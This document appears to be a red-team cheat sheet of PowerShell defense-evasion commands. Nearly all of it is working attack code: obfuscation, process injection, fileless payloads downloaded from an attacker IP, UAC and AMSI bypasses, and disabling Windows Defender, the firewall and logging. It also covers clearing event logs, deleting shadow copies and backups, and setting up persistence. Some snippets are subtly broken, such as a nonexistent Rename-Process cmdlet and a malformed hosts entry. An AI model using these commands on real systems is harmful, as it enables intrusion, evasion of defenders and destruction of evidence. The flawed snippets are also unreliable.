# PowerShell - Defense Evasion Host Based

## Command and Script Obfuscation&#x20;

Obfuscating PowerShell scripts can make them harder to detect by signature-based security tools.

**Base64 Encode PowerShell Commands**&#x20;

```powershell
$command = "Start-Process powershell.exe -ArgumentList 'whoami'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded
```

**Variable Name Obfuscation**&#x20;

Rename variable names to meaningless or randomized strings.

```powershell
$a = Get-Process; $b = $a | Where-Object { $_.Name -eq 'explorer' }
```

**Function Obfuscation**&#x20;

```powershell
Function Get-User { whoami } 
Invoke-Expression (Get-Content C:\path\to\script.ps1 | Out-String)
```

**String Reversal**&#x20;

```powershell
$cmd = "[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('d2hvYW1p'))"
Invoke-Expression $cmd
```

## File and Directory Obfuscation&#x20;

**Creating Hidden Files/Directories**&#x20;

* Creates a hidden file:

```powershell
New-Item -Path "C:\Windows\System32\drivers\etc\hidden_file.txt" -ItemType "file" -Force
```

* Creates a hidden directory:

```powershell
New-Item -Path "C:\Windows\System32\drivers\etc\hidden_dir" -ItemType "directory" -Force
```

* Set file attributes to hidden and system:

```powershell
Set-ItemProperty -Path "C:\Windows\System32\drivers\etc\hidden_file.txt" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
```

**Using Stealthy File Names**&#x20;

* Rename a file to a legitimate-looking name:

```powershell
Rename-Item -Path "C:\Users\Public\malicious.ps1" -NewName "legit.ps1"
```

* Create files with misleading extensions:

```powershell
New-Item -Path "C:\Windows\Temp\document.txt.exe" -ItemType "file"
```

**Hiding Files in Alternate Data Streams (ADS)**&#x20;

* Create an alternate data stream:

```powershell
Set-Content -Path "C:\Windows\System32\notepad.exe:hidden.txt" -Value "Malicious Content"
```

* Access data in an alternate data stream:

```powershell
Get-Content -Path "C:\Windows\System32\notepad.exe:hidden.txt"
```

**Modifying System Timestamps (Timestomping)**&#x20;

* Modify file timestamps to make them appear older:

```powershell
(Get-Item "C:\Windows\System32\drivers\etc\hosts").LastWriteTime = "01/01/2020 12:00:00"
```

* Change the creation time of a file:

```powershell
(Get-Item "C:\Windows\System32\drivers\etc\hosts").CreationTime = "01/01/2020 12:00:00"
```

## Process Injection and Hiding&#x20;

Injecting into legitimate processes or running PowerShell commands in memory can help evade detection.

**Process Injection Using `Invoke-ReflectivePEInjection`**&#x20;

```powershell
Invoke-ReflectivePEInjection -PEBytes (Get-Content C:\path\to\malicious.exe -Encoding Byte) -ProcessID (Get-Process explorer).Id
```

**Spawn a Hidden PowerShell Process**&#x20;

```powershell
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command <commands>"
```

**Inject Shellcode into Another Process (e.g., `explorer.exe`)**&#x20;

```powershell
$pid = (Get-Process explorer).Id
$code = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4096)
[System.Runtime.InteropServices.Marshal]::Copy([System.Text.Encoding]::ASCII.GetBytes("<shellcode>"), 0, $code, 4096)
$handle = (Get-Process -Id $pid).Handle
Invoke-ReflectivePEInjection -PEBytes $code -ProcessID $pid
```

**Renaming a Malicious Process**&#x20;

* Rename a malicious executable to a legitimate name:

```powershell
Rename-Item -Path "C:\Temp\malicious.exe" -NewName "svchost.exe"
```

**Using Background Execution**&#x20;

* Run a process in the background (hidden window):

```powershell
Start-Process -FilePath "C:\Windows\System32\notepad.exe" -WindowStyle Hidden
```

**Disguising Process Names in Task Manager**&#x20;

*   Rename a malicious process in-memory (requires advanced techniques or tools like Process Hacker):

    ```powershell
    Invoke-Expression "Rename-Process -ProcessId 1234 -NewName 'explorer.exe'"
    ```

    * Note: PowerShell alone does not support renaming processes in memory without additional tools or scripts.\_

## Fileless Execution and Living off the Land&#x20;

Fileless techniques reduce the likelihood of detection by not writing malicious files to disk.

**Execute a Fileless PowerShell Payload**&#x20;

```powershell
powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "IEX(New-Object Net.WebClient).DownloadString('http://<attack_ip>/payload.ps1')"
```

**Use MSBuild for Fileless Execution**&#x20;

```powershell
msbuild.exe C:\path\to\malicious_project.xml
```

**Run a Malicious Script from Memory**&#x20;

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<attack_ip>/malicious.ps1')
```

## Modifying User and Permission Settings&#x20;

**Creating a Hidden User**&#x20;

* Create a new user with minimal privileges and a hidden SID:

```powershell
net user hiddenuser Password123 /add /active:no
```

**Modifying Existing User Permissions**&#x20;

* Add a user to the Administrators group:

```powershell
Add-LocalGroupMember -Group "Administrators" -Member "hiddenuser"
```

**Clearing Event Logs**&#x20;

* Clear security event logs:

```powershell
wevtutil cl Security
```

* Clear system event logs:

```powershell
wevtutil cl System
```

## Bypassing User Account Control (UAC)&#x20;

UAC bypass allows for executing elevated processes without triggering security alerts.

**UAC Bypass Using `fodhelper`**&#x20;

```powershell
$command = "Start-Process powershell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass'"
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "" -Value $command
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""
Start-Process fodhelper.exe
```

**UAC Bypass Using Event Viewer**&#x20;

```powershell
Start-Process eventvwr.msc
```

## Manipulating Scheduled Tasks&#x20;

**Creating a Stealthy Scheduled Task**&#x20;

* Create a scheduled task that runs a script at system startup:

```powershell
schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\update.ps1" /sc onstart /ru SYSTEM
```

* Create a hidden scheduled task:

```powershell
schtasks /create /tn "UpdateCheck" /tr "C:\Windows\Temp\legit.ps1" /sc daily /st 02:00 /ru SYSTEM /f /it /np
```

**Disabling Logging in Scheduled Tasks**&#x20;

* Create a scheduled task that suppresses output:

```powershell
schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\update.ps1 > $null 2>&1" /sc onstart /ru SYSTEM
```

## Disabling or Manipulating Security Tools&#x20;

Manipulating security tools, such as antivirus or Windows Defender, is a common evasion technique.

**Disabling Windows Defender's Tamper Protection**&#x20;

* Disable tamper protection via registry (requires restart):

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0
```

**Disabling Windows Defender Signature Updates**&#x20;

```powershell
Set-MpPreference -DisableAutoExclusions $true
```

**Disable Windows Defender Network Protection**&#x20;

```powershell
Set-MpPreference -DisableNetworkProtection $true
```

**Disable Windows Defender Scan for Archive Files**&#x20;

```powershell
Set-MpPreference -DisableArchiveScanning $true
```

**Disable Windows Defender Real-Time Monitoring**&#x20;

* Disable Windows Defender real-time protection:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

* Turn off Windows Defender via registry (requires admin privileges):

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
```

**Disable Windows Defender via Registry**&#x20;

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
```

**Add Exclusion to Windows Defender**&#x20;

```powershell
Add-MpPreference -ExclusionPath "C:\Path\To\Malicious\Folder"
Add-MpPreference -ExclusionProcess "malicious.exe"
```

**Disable Windows Defender's Cloud-Delivered Protection**&#x20;

```powershell
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2
```

**Disable Windows Firewall**&#x20;

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

**Avoiding Windows Defender via Obfuscation**&#x20;

* Use obfuscated scripts to bypass detection (simple example):

```powershell
$code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JABhACA9ACAAIgBoAGUAbABsAG8AIgA=")); iex $code
```

## AMSI (Antimalware Scan Interface) Bypass&#x20;

AMSI is used by Windows Defender and other AV tools to scan PowerShell commands. Bypassing AMSI allows you to execute malicious code without scanning.

**AMSI Bypass with PowerShell**&#x20;

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic, Static').SetValue($null, $true)
```

**AMSI Bypass by Patching in Memory**&#x20;

```powershell
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::GetField('amsiInitFailed','NonPublic,Static')
$amsi.SetValue($null,$true)
```

## Anti-Forensics and Data Destruction&#x20;

**Securely Deleting Files**&#x20;

*   Use `sdelete` to securely delete files:

    ```powershell
    sdelete.exe -p 3 -s -q "C:\Path\to\file.txt"
    ```

    * Note: `sdelete` is a Sysinternals tool that must be downloaded separately.

## Clearing and Disabling Event Logs&#x20;

Clearing or disabling event logs helps adversaries erase evidence of their activities.

**Tampering with Sysmon Logs**&#x20;

* Disable Sysmon service:

```powershell
Stop-Service -Name "Sysmon64" -Force
```

* Uninstall Sysmon:

```powershell
& 'C:\Path\to\Sysmon.exe' -u
```

**Disable Windows Event Collection**&#x20;

* Stop the Windows Event Collector service:

```powershell
Stop-Service -Name "Wecsvc" -Force
```

* Disable the Windows Event Collector service:

```powershell
Set-Service -Name "Wecsvc" -StartupType Disabled
```

**Disable PowerShell Script Block Logging**&#x20;

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
```

**Clearing Powershell History**&#x20;

* Clear the current Powershell session's history:

```powershell
Clear-History
```

* Delete the Powershell history file:

```powershell
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

**Disable PowerShell Transcription**&#x20;

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0
```

**Disable Windows Event Logs**&#x20;

```powershell
Stop-Service -Name "eventlog" -Force
```

**Disabling Windows Event Logs**&#x20;

* Disable specific event logging providers:

```powershell
wevtutil sl "Microsoft-Windows-Security-Auditing" /e:false
```

* Stop the Windows Event Log service:

```powershell
Stop-Service -Name "eventlog" -Force
```

**Clear Specific Event Log**&#x20;

```powershell
Clear-EventLog -LogName "Security"
```

**Clear Multiple Event Logs**&#x20;

```powershell
Get-EventLog -LogName * | ForEach-Object { Clear-EventLog -LogName $_.Log }
```

**Clear Event Logs**&#x20;

```powershell
wevtutil cl Application
wevtutil cl System
wevtutil cl Security
```

**Tampering with Log Files**&#x20;

* Overwrite the security log with garbage data:

```powershell
Out-Null > C:\Windows\System32\winevt\Logs\Security.evtx
```

**Remove a Malicious Script After Execution:**&#x20;

```powershell
Start-Process powershell -ArgumentList "-NoProfile -Command Remove-Item C:\path\to\malicious.ps1 -Force"
```

**Clear Prefetch Files (May Impact System Performance):**&#x20;

```powershell
Remove-Item -Path C:\Windows\Prefetch\*.pf
```

## Manipulating Registry Settings&#x20;

Modify registry keys to achieve persistence while hiding your changes from defenders.

**Hiding Evidence in the Registry**&#x20;

* Create a registry key to hide a startup program:

```powershell
New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "C:\Path\to\malicious.exe"
```

* Use obfuscated registry keys:

```powershell
$obfuscatedKey = "HKCU:\Software\Microsoft\" + [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cw=="))
New-Item -Path $obfuscatedKey -Name "SecurityCenter" -Value "C:\Path\to\malicious.exe"
```

* Delete evidence of registry modifications:

```powershell
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate"
```

**Modifying Registry to Disable Security Features**&#x20;

* Disable UAC (User Account Control):

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
```

* Disable Windows Defender through the registry:

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
```

**Persisting via Registry Modification**&#x20;

* Create a registry key for persistence (example using `Run` key):

```powershell
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateService" -Value "C:\Path\to\malicious.exe" -PropertyType "String"
```

## Credential Dumping and Evasion&#x20;

**Clearing Cached Credentials**&#x20;

* Clear the Windows Credential Cache:

```powershell
cmdkey /list | ForEach-Object {cmdkey /delete:$_}
```

* Delete saved credentials from the registry:

```powershell
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Authentication\LogonUI" -Recurse
```

## Memory Manipulation&#x20;

**Memory Injection**&#x20;

* Inject a DLL into a running process using `Invoke-ReflectivePEInjection`:

```powershell
Invoke-ReflectivePEInjection -PEPath "C:\Path\to\malicious.dll" -ProcessID <pid>
```

**Manipulating Memory for Anti-Debugging**&#x20;

* Use `RtlSetProcessIsCritical` to make the process critical (causes BSOD if terminated):

```powershell
[DllImport("ntdll.dll")]
public static extern int RtlSetProcessIsCritical(bool bNewValue, bool bOldValue, bool bNeedScb);
```

**Clearing Memory to Avoid Forensics**&#x20;

* Zero out memory of a specific process:

```powershell
[System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocAnsi([IntPtr]::Zero)
```

## Anti-Analysis Techniques&#x20;

**Detecting Virtual Machines**&#x20;

* Check for common VM artifacts:

```powershell
if (Get-WmiObject -Class Win32_BIOS | Select-String -Pattern "VirtualBox|VMware") { Exit }
```

* Exit if running in a virtualized environment:

```powershell
$bios = Get-WmiObject Win32_BIOS
if ($bios.SerialNumber -match "VMware|VBOX") { Exit }
```

**Obfuscating Powershell Scripts**&#x20;

* Obfuscate script using `Invoke-Obfuscation` (requires Invoke-Obfuscation module):

```powershell
Invoke-Obfuscation
```

* Encode a Powershell command to bypass basic defenses:

```powershell
$command = 'Get-Process'
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
powershell.exe -EncodedCommand $encodedCommand
```

**Anti-Debugging with Infinite Loop**&#x20;

* Create an infinite loop to detect debugging:

```powershell
while ($true) { Write-Output "Running"; Start-Sleep -Milliseconds 100 }
```

## Disabling and Manipulating System Recovery Options&#x20;

**Disable System Restore**&#x20;

* Disable system restore points:

```powershell
Disable-ComputerRestore -Drive "C:\"
```

* Delete all restore points:

```powershell
vssadmin delete shadows /all /quiet
```

**Tampering with Backup and Recovery Settings**&#x20;

* Delete backup catalog to prevent recovery:

```powershell
wbadmin delete catalog -quiet
```

* Disable Volume Shadow Copy Service (VSS):

```powershell
Stop-Service -Name "VSS" -Force Set-Service -Name "VSS" -StartupType Disabled
```

## Network Evasion Techniques&#x20;

**Disabling Network Adapters Temporarily**&#x20;

* Disable a network adapter to avoid detection:

```powershell
Disable-NetAdapter -Name "Ethernet0" -Confirm:$false
```

* Re-enable the network adapter:

```powershell
Enable-NetAdapter -Name "Ethernet0" -Confirm:$false
```

**Using Proxy for Obfuscation**&#x20;

* Set a system-wide proxy for obfuscation:

```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "http=proxy.example.com:8080"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 1
```

* Remove the proxy setting:

```
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 0
```

**Modifying ARP Cache**&#x20;

* Add a static ARP entry (useful for man-in-the-middle attacks):

```powershell
arp -s <target_ip> <attack_mac>
```

* Delete an ARP entry:

```powershell
arp -d <target_ip>
```

## Manipulating DNS and Network Settings&#x20;

**Modify Hosts File for Evasion**&#x20;

* Add an entry to the hosts file to redirect traffic:

```powershell
Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "127.0.0 malicious-site.com"
```

* Clear the hosts file:

```powershell
Clear-Content -Path "C:\Windows\System32\drivers\etc\hosts"
```

**Flush DNS Cache to Remove Evidence**&#x20;

* Flush the DNS cache:

```powershell
Clear-DnsClientCache
```
